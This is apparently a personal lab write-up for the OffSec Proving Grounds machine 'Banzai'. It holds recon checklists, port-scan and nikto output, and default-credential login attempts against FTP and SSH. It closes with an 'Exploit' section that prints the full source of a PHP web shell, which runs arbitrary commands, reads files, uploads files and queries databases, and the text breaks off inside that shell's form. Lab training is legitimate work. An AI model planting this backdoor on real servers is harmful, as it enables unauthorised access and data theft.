# Banzai

# Plan

## 21 - FTP
Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [x] Hacktricks https://book.hacktricks.xyz/pentesting/pentesting-ftp
	- [ ] FTP Bounce Attack

Search & Test for Vulnerabilities `(I)`
- [x] Searchsploit
	- [x] Remote denial of Service - Useless
- [ ] Google
- [ ] More

Logging in
- [x] Anonymous/ Null Login - **Doesn't work**
Brute Force `I` 
- [ ] `admin` : `admin`, `admin`:`password`,
- [ ] Same as username (eg. `mario` : `mario`)
- [ ] rockyou.txt
- [ ] More

## 22 - SSH

Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

Logging in
Brute Force `I` 
- [x] `admin` : `admin`, `admin`:`password`, `guest`:`guest`, `backup`:`backup`
- [ ] Same as username (eg. `mario` : `mario`)
- [ ] rockyou.txt
- [ ] More

## 5432 - PostgreSQL

Understand how it works & Interact  [ ] `(I)`
- [x] Find the Official Documentation https://www.postgresql.org/docs/
- [ ] Google

Custom ways of Exploitation
- [x] Hacktricks https://book.hacktricks.xyz/pentesting/pentesting-postgresql
	- [ ] Enumerate Database
	- [ ] More

Search & Test for Vulnerabiliaties `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

Logging in - **IP blacklist**

Logging in - **For Privesc**
- [ ] Anonymous/ Null Login
Brute Force `I` 
- [ ] `admin` : `admin`, and other common ones
- [ ] Same as username (eg. `mario` : `mario`)
- [ ] rockyou.txt
- [ ] More

## 8080 - Web

Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

**Basic**

Source Code `E`
- [x] Find all the files, hidden or not (if possible)
- [ ] Look through the source code of ALL the files
    - [ ] Find all Input Fields `-> Input Fields`
    - [ ] File Uploads `-> File upload`

Directory Enumeration (dirb) `I -> Custom page/ CMS`
- [x] Sitemap (robots.txt)
- [x] Common wordlist
- [x] big wordlist
- [ ] More

Virtual Hosts Testing `I`
- [x] Given hostname - No Given
- [x] Hostname derived from box name - *banzai.pg* - No Diff
- [x] Enumerated - banzai.offseclabs.com - No Diff
- [ ] More

Vulnerability Scanning `I`
- [x] Nikto Vulnerability Scanner
- [ ] More

## 8295 - Web


Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

**Basic**

Source Code `E`
- [ ] Find all the files, hidden or not (if possible)
- [x] Look through the source code of ALL the files
	- [x] Looks like standard web template you can find online
    - [ ] Find all Input Fields `-> Input Fields`
    - [ ] File Uploads `-> File upload`

Directory Enumeration (dirb) `I -> Custom page/ CMS`
- [x] Sitemap (robots.txt)
- [x] Common wordlist
- [x] big wordlist
- [ ] More

Virtual Hosts Testing `I`
- [x] Given hostname - No Given
- [x] Hostname derived from box name - *banzai.pg* - No Diff
- [ ] More

Vulnerability Scanning `I`
- [x] Nikto Vulnerability Scanner
- [ ] More

# Enumeration
## Autorecon

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Banzai]
└─$ sudo /home/kali/.local/bin/autorecon 192.168.123.56 -v
[sudo] password for kali: 
[*] Scanning target 192.168.123.56
[*] Port scan Top TCP Ports (top-tcp-ports) running against 192.168.123.56
[*] Port scan All TCP Ports (all-tcp-ports) running against 192.168.123.56
[*] Port scan Top 100 UDP Ports (top-100-udp-ports) running against 192.168.123.56
[*] Discovered open port tcp/21 on 192.168.123.56
[*] Discovered open port tcp/22 on 192.168.123.56
[*] Discovered open port tcp/25 on 192.168.123.56
[*] Discovered open port tcp/8080 on 192.168.123.56
[*] Identified service ftp on tcp/21 on 192.168.123.56
[*] Identified service ssh on tcp/22 on 192.168.123.56
[*] Identified service smtp on tcp/25 on 192.168.123.56
[*] Identified service postgresql on tcp/5432 on 192.168.123.56
[*] Identified service http on tcp/8080 on 192.168.123.56
[*] Service scan Nmap FTP (tcp/21/ftp/nmap-ftp) running against 192.168.123.56
[*] Service scan Nmap SSH (tcp/22/ssh/nmap-ssh) running against 192.168.123.56
[*] Service scan Nmap SMTP (tcp/25/smtp/nmap-smtp) running against 192.168.123.56
[*] Service scan SMTP-User-Enum (tcp/25/smtp/smtp-user-enum) running against 192.168.123.56
[*] Service scan Directory Buster (tcp/8080/http/dirbuster) running against 192.168.123.56
[*] Service scan Curl (tcp/8080/http/curl) running against 192.168.123.56
[*] Service scan Curl Robots (tcp/8080/http/curl-robots) running against 192.168.123.56
[*] Service scan Nmap HTTP (tcp/8080/http/nmap-http) running against 192.168.123.56
[*] Service scan whatweb (tcp/8080/http/whatweb) running against 192.168.123.56
[*] Service scan wkhtmltoimage (tcp/8080/http/wkhtmltoimage) running against 192.168.123.56
[*] [tcp/8080/http/curl-robots] There did not appear to be a robots.txt file in the webroot (/).
[*] Discovered open port tcp/8295 on 192.168.123.56
[*] 12:34:33 - There are 5 scans still running against 192.168.123.56: all-tcp-ports, top-100-udp-ports, tcp/25/smtp/nmap-smtp, tcp/8080/http/dirbuster, tcp/8080/http/nmap-http                                                                                                                                                                
[*] 12:35:33 - There are 3 scans still running against 192.168.123.56: all-tcp-ports, top-100-udp-ports, tcp/8080/http/dirbuster
[*] Discovered open port tcp/5432 on 192.168.123.56
[*] 12:36:33 - There are 3 scans still running against 192.168.123.56: all-tcp-ports, top-100-udp-ports, tcp/8080/http/dirbuster
[*] Identified service http on tcp/8295 on 192.168.123.56
[*] Service scan Directory Buster (tcp/8295/http/dirbuster) running against 192.168.123.56
[*] Service scan Curl (tcp/8295/http/curl) running against 192.168.123.56
[*] Service scan Curl Robots (tcp/8295/http/curl-robots) running against 192.168.123.56
[*] Service scan Nmap HTTP (tcp/8295/http/nmap-http) running against 192.168.123.56
[*] Service scan whatweb (tcp/8295/http/whatweb) running against 192.168.123.56
[*] Service scan wkhtmltoimage (tcp/8295/http/wkhtmltoimage) running against 192.168.123.56
[*] 12:37:33 - There are 4 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster, tcp/8295/http/nmap-http
[*] 12:38:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster
[*] 12:39:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster
[*] 12:40:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster
[*] 12:41:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster
[*] 12:42:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster
[*] 12:43:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster
[*] 12:44:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster
[*] 12:45:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster
[*] 12:46:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster
[*] 12:47:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster
[*] 12:48:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster
[*] 12:49:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster
[*] 12:50:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster                          
[*] 12:51:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster
[*] 12:52:34 - There are 3 scans still running against 192.168.123.56: top-100-udp-ports, tcp/8080/http/dirbuster, tcp/8295/http/dirbuster   

...

[*] 17:31:43 - There is 1 scan still running against 192.168.123.56: tcp/8295/http/dirbuster
[*] 17:32:43 - There is 1 scan still running against 192.168.123.56: tcp/8295/http/dirbuster
[*] 17:33:43 - There is 1 scan still running against 192.168.123.56: tcp/8295/http/dirbuster
[*] Finished scanning target 192.168.123.56 in 5 hours, 36 seconds
[*] Finished scanning all targets in 5 hours, 37 seconds!
[*] Don't forget to check out more commands to run manually in the _manual_commands.txt file in each target's scans directory!
[!] AutoRecon identified the following services, but could not match them to any plugins based on the service name. Please report these to Tib3rius: tcp/5432/postgresql/insecure                                                                                                                                                               
                        
```

## nmap

```
# Nmap 7.91 scan initiated Sat Jan 15 12:33:34 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Banzai/results/192.168.123.56/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Banzai/results/192.168.123.56/scans/xml/_full_tcp_nmap.xml" 192.168.123.56
Nmap scan report for 192.168.123.56
Host is up, received user-set (0.17s latency).
Scanned at 2022-01-15 12:33:36 EST for 187s
Not shown: 65528 filtered ports
Reason: 65528 no-responses
PORT     STATE  SERVICE    REASON         VERSION
20/tcp   closed ftp-data   reset ttl 63
21/tcp   open   ftp        syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open   ssh        syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCybLhvDM6WN4Um6RXgjUecDnd4j/h14PyuqRaLgWRDaQlyWakjDG21gvvltRKiKfDvTHXBS+gDAbGLEmD58g41NE1ocCf5uGtmn79Z3BOR+7BdP1PETWb4a9GR+PdrvXpD16mIHZORhs4RAkeBpexcKOkFXCFatjymyVAcNB8E+Twh879lb55hxEz9cLlA8RAiPPfuW5S7nCRhw7xEi9mdtlvURCFNLb7eCGDUOQu5op2r6XpxZi0eYXJVde/13AiYxvACA2sRoMDCQwIYLhXwpA1Z7LseLxSmMHwyDXrxCU9xDJ+HL9EaHozBdHCOnnuHqPtb5EPZ3/JTg3qnS0dR
|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNRPQTMD0l4TqSTmzmck9Rhq1ULCN0ErNvXipXv1HBKoRUgdbdwxhFerbDTxxJYd+12RFoZgNNUDZmSH7+PGvpo=
|   256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDpzo9sh+q0DgrOjD1plfJ9xj9zIjezUBGWzdNlde40M
25/tcp   open   smtp       syn-ack ttl 63 Postfix smtpd
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Issuer: commonName=banzai
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-06-04T14:30:35
| Not valid after:  2030-06-02T14:30:35
| MD5:   3b28 61f1 af62 d273 0a3d dc1f f716 60c0
| SHA-1: 16d4 7b5e b6f4 0cc5 e581 da6c 563d edcf 3f8f 0072
| -----BEGIN CERTIFICATE-----
| MIICxTCCAa2gAwIBAgIJAOwMttjJ91fXMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
| BAMMBmJhbnphaTAeFw0yMDA2MDQxNDMwMzVaFw0zMDA2MDIxNDMwMzVaMBExDzAN
| BgNVBAMMBmJhbnphaTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANSD
| KNoh+InV/GzD8Fn6TPapcKXOWc7mPwvV70p4Qm5hPSEbvH83yFPX56qQQnKmOUlE
| hIhXxMapYJGLMmL+ipsWXXz/6s5y28Mfk8XdhwvzJ/pCfawDPnYwff7jtfgz5qlf
| JHLULDr+fjXLPlyefiUEj8kpmZCHKhxra5MG/M6urW72faf8x4XUsi7y/qJQoBeH
| nKf6n0upVtPp1FLKSkJgfBouSDDPy0KBTdKs9YjnFtcDJt6+Ll0m9Wj4rnF8m/67
| oguSxsqd94gPpdnUo4mKmqnwNq/kdC/gopIOjxo44043O11OQd+x97Wy+GrqPa4W
| Zw8uwxc2FnQe3pevrssCAwEAAaMgMB4wCQYDVR0TBAIwADARBgNVHREECjAIggZi
| YW56YWkwDQYJKoZIhvcNAQELBQADggEBAJUjJMMvV12i1Kzh5bTrGIW3AF5eJtZz
| CQCIgw6asjV5aiJGx58BFox6LkN9JzZsiQKNrLtA62FnAj1LWGd1+dt+fPNayiOG
| ZjLeZfXBN4dPOlrT9YU+gyqJJWEuMcvwzGMMqa4W/WW9E6+Q9o3w+lhdJhZTMzsq
| 11M/CGd5mjZHa1hMQNxTef8BpHn6yGOi9k6PncGHIUSapxcy3+7HQXJEap65m8eT
| jPZdt1hXouOZsNbtQkW32oiQ+4snDmjgbvoqZKF68/UV/3if5S3F6MCI7go8i3yu
| SHIIOYrPzXEb5U8Vw8UDUEn/4WV3h9j4ouZHDibV2gRs6VPThzR7SdE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
5432/tcp open   postgresql syn-ack ttl 63 PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Issuer: commonName=banzai
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-06-04T14:30:35
| Not valid after:  2030-06-02T14:30:35
| MD5:   3b28 61f1 af62 d273 0a3d dc1f f716 60c0
| SHA-1: 16d4 7b5e b6f4 0cc5 e581 da6c 563d edcf 3f8f 0072
| -----BEGIN CERTIFICATE-----
| MIICxTCCAa2gAwIBAgIJAOwMttjJ91fXMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
| BAMMBmJhbnphaTAeFw0yMDA2MDQxNDMwMzVaFw0zMDA2MDIxNDMwMzVaMBExDzAN
| BgNVBAMMBmJhbnphaTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANSD
| KNoh+InV/GzD8Fn6TPapcKXOWc7mPwvV70p4Qm5hPSEbvH83yFPX56qQQnKmOUlE
| hIhXxMapYJGLMmL+ipsWXXz/6s5y28Mfk8XdhwvzJ/pCfawDPnYwff7jtfgz5qlf
| JHLULDr+fjXLPlyefiUEj8kpmZCHKhxra5MG/M6urW72faf8x4XUsi7y/qJQoBeH
| nKf6n0upVtPp1FLKSkJgfBouSDDPy0KBTdKs9YjnFtcDJt6+Ll0m9Wj4rnF8m/67
| oguSxsqd94gPpdnUo4mKmqnwNq/kdC/gopIOjxo44043O11OQd+x97Wy+GrqPa4W
| Zw8uwxc2FnQe3pevrssCAwEAAaMgMB4wCQYDVR0TBAIwADARBgNVHREECjAIggZi
| YW56YWkwDQYJKoZIhvcNAQELBQADggEBAJUjJMMvV12i1Kzh5bTrGIW3AF5eJtZz
| CQCIgw6asjV5aiJGx58BFox6LkN9JzZsiQKNrLtA62FnAj1LWGd1+dt+fPNayiOG
| ZjLeZfXBN4dPOlrT9YU+gyqJJWEuMcvwzGMMqa4W/WW9E6+Q9o3w+lhdJhZTMzsq
| 11M/CGd5mjZHa1hMQNxTef8BpHn6yGOi9k6PncGHIUSapxcy3+7HQXJEap65m8eT
| jPZdt1hXouOZsNbtQkW32oiQ+4snDmjgbvoqZKF68/UV/3if5S3F6MCI7go8i3yu
| SHIIOYrPzXEb5U8Vw8UDUEn/4WV3h9j4ouZHDibV2gRs6VPThzR7SdE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
8080/tcp open   http       syn-ack ttl 63 Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: 403 Forbidden
8295/tcp open   http       syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Banzai
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 3.11 - 4.1 (93%), Linux 3.16 (92%), Linux 4.4 (92%), Linux 3.13 (90%), Linux 3.10 - 3.12 (88%), Linux 3.2 - 3.8 (88%), WatchGuard Fireware 11.8 (88%), IPFire 2.11 firewall (Linux 2.6.32) (87%), Linux 4.9 (87%), Linux 3.10 - 3.16 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/15%OT=21%CT=20%CU=%PV=Y%DS=2%DC=T%G=N%TM=61E3062B%P=x86_64-pc-linux-gnu)
SEQ(SP=FD%GCD=1%ISR=10E%TI=Z%II=I%TS=8)
SEQ(SP=FE%GCD=1%ISR=10E%TI=Z%TS=8)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=N)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.002 days (since Sat Jan 15 12:33:41 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 20/tcp)
HOP RTT       ADDRESS
1   171.06 ms 192.168.49.1
2   171.06 ms 192.168.123.56

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 15 12:36:43 2022 -- 1 IP address (1 host up) scanned in 189.90 seconds

```

**Vuln**

```
┌──(kali㉿kali)-[/tmp]
└─$ nmap --script vuln 192.168.123.56 -p 21,22,25,5432,8080,8295 -Pn -v                                                                                           130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-15 13:11 EST
NSE: Loaded 105 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:11
Completed NSE at 13:11, 10.02s elapsed
Initiating NSE at 13:11
Completed NSE at 13:11, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:11
Completed Parallel DNS resolution of 1 host. at 13:11, 0.02s elapsed
Initiating Connect Scan at 13:11
Scanning 192.168.123.56 [6 ports]
Discovered open port 25/tcp on 192.168.123.56
Discovered open port 21/tcp on 192.168.123.56
Discovered open port 22/tcp on 192.168.123.56
Discovered open port 8080/tcp on 192.168.123.56
Discovered open port 5432/tcp on 192.168.123.56
Discovered open port 8295/tcp on 192.168.123.56
Completed Connect Scan at 13:11, 0.18s elapsed (6 total ports)
NSE: Script scanning 192.168.123.56.
Initiating NSE at 13:11
NSE: [tls-ticketbleed] Not running due to lack of privileges.
NSE: [firewall-bypass] lacks privileges.
Completed NSE at 13:11, 24.02s elapsed
Initiating NSE at 13:11
Completed NSE at 13:11, 0.00s elapsed
Nmap scan report for 192.168.123.56
Host is up (0.18s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
|_sslv2-drown: 
22/tcp   open  ssh
25/tcp   open  smtp
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
| ssl-dh-params: 
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 2048
|             Generator Length: 8
|             Public Key Length: 2048
|     References:
|_      https://www.ietf.org/rfc/rfc2246.txt
|_sslv2-drown: 
5432/tcp open  postgresql
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
|_sslv2-drown: 
8080/tcp open  http-proxy
8295/tcp open  unknown

NSE: Script Post-scanning.
Initiating NSE at 13:11
Completed NSE at 13:11, 0.00s elapsed
Initiating NSE at 13:11
Completed NSE at 13:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 35.10 seconds

```

## 21 - FTP

```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.123.56   
Connected to 192.168.123.56.
220 (vsFTPd 3.0.3)
Name (192.168.123.56:kali): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> exit
221 Goodbye.

```

Guessed `admin`:`admin`



## 22 - SSH

```
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ ssh admin@192.168.123.56 
The authenticity of host '192.168.123.56 (192.168.123.56)' can't be established.
ECDSA key fingerprint is SHA256:0OikQbtBgNXKbu2oB+l+obzQBd5YYqjum0dzf3WhSz8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.123.56' (ECDSA) to the list of known hosts.
admin@192.168.123.56's password: 
Permission denied, please try again.
admin@192.168.123.56's password: 
Permission denied, please try again.
admin@192.168.123.56's password: 
admin@192.168.123.56: Permission denied (publickey,password).
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ ssh guest@192.168.123.56
guest@192.168.123.56's password: 
Permission denied, please try again.
guest@192.168.123.56's password: 

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ ssh backup@192.168.123.56
backup@192.168.123.56's password: 
Permission denied, please try again.
backup@192.168.123.56's password: 

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$             
```

## 5432 - PostgreSQL

```
┌──(kali㉿kali)-[/tmp]
└─$ psql -h 192.168.123.56 -U postgres
psql: error: FATAL:  no pg_hba.conf entry for host "192.168.49.123", user "postgres", database "postgres", SSL on
FATAL:  no pg_hba.conf entry for host "192.168.49.123", user "postgres", database "postgres", SSL off
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$            
```

## 8080 - Web

All 403
Suspect the web content is too high privileges

### nikto

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Banzai]
└─$ nikto -h http://192.168.123.56:8080/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.123.56
+ Target Hostname:    192.168.123.56
+ Target Port:        8080
+ Start Time:         2022-01-15 19:56:32 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ All CGI directories 'found', use '-C none' to test none
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26547 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2022-01-15 21:17:23 (GMT-5) (4851 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Banzai]
└─$ 

```

## 8295 - Web

### nikto

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Banzai]
└─$ nikto -h http://192.168.123.56:8295/ 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.123.56
+ Target Hostname:    192.168.123.56
+ Target Port:        8295
+ Start Time:         2022-01-15 19:56:21 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /lib/: Directory indexing found.
+ OSVDB-3092: /lib/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7917 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2022-01-15 20:21:48 (GMT-5) (1527 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Banzai]
└─$ 

```

Uses this template
https://bootstrapmade.com/regna-bootstrap-onepage-template/download/




# Exploit

## Upload PHP backdoor

File
```
<?php
// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombie \\

ob_implicit_flush();
if(isset($_REQUEST['f'])){
        $filename=$_REQUEST['f'];
        $file=fopen("$filename","rb");
        fpassthru($file);
        die;
}
if(isset($_REQUEST['d'])){
        $d=$_REQUEST['d'];
        echo "<pre>";
        if ($handle = opendir("$d")) {
        echo "<h2>listing of $d</h2>";
                   while ($dir = readdir($handle)){ 
                       if (is_dir("$d/$dir")) echo "<a href='$PHP_SELF?d=$d/$dir'><font color=grey>";
							else echo "<a href='$PHP_SELF?f=$d/$dir'><font color=black>";
                       echo "$dir\n"; 
                       echo "</font></a>";
                }
                       
        } else echo "opendir() failed";
        closedir($handle);
        die ("<hr>"); 
}
if(isset($_REQUEST['c'])){
	echo "<pre>";
	system($_REQUEST['c']);		   
	die;
}
if(isset($_REQUEST['upload'])){

		if(!isset($_REQUEST['dir'])) die('hey,specify directory!');
			else $dir=$_REQUEST['dir'];
		$fname=$HTTP_POST_FILES['file_name']['name'];
		if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))
			die('file uploading error.');
}
if(isset($_REQUEST['mquery'])){
	
	$host=$_REQUEST['host'];
	$usr=$_REQUEST['usr'];
	$passwd=$_REQUEST['passwd'];
	$db=$_REQUEST['db'];
	$mquery=$_REQUEST['mquery'];
	mysql_connect("$host", "$usr", "$passwd") or
    die("Could not connect: " . mysql_error());
    mysql_select_db("$db");
    $result = mysql_query("$mquery");
	if($result!=FALSE) echo "<pre><h2>query was executed correctly</h2>\n";
    while ($row = mysql_fetch_array($result,MYSQL_ASSOC)) print_r($row);  
    mysql_free_result($result);
	die;
}
?>
<pre><form action="<?php echo $PHP_SELF; ?>" METHOD=GET >execute command: <input type="text" name="c"><input type="submit" value="go"><hr></form> 
<form enctype="multipart/form-data" action="<?php echo $PHP_SELF; ?>" method="post"><input type="hidden" name="MAX_FILE_SIZE" value="1000000000">
upload file:<input name="file_name" type="file">   to dir: <input type="text" name="dir">&nbsp;&nbsp;<input type="submit" name="upload" value="upload"></form>
<hr>to browse go to http://<?php echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory here]
<br>for example:
http://<?php echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix
or http://<?php echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win
<hr>execute mysql query:
<form action="<?php echo $PHP_SELF; ?>" METHOD=GET >
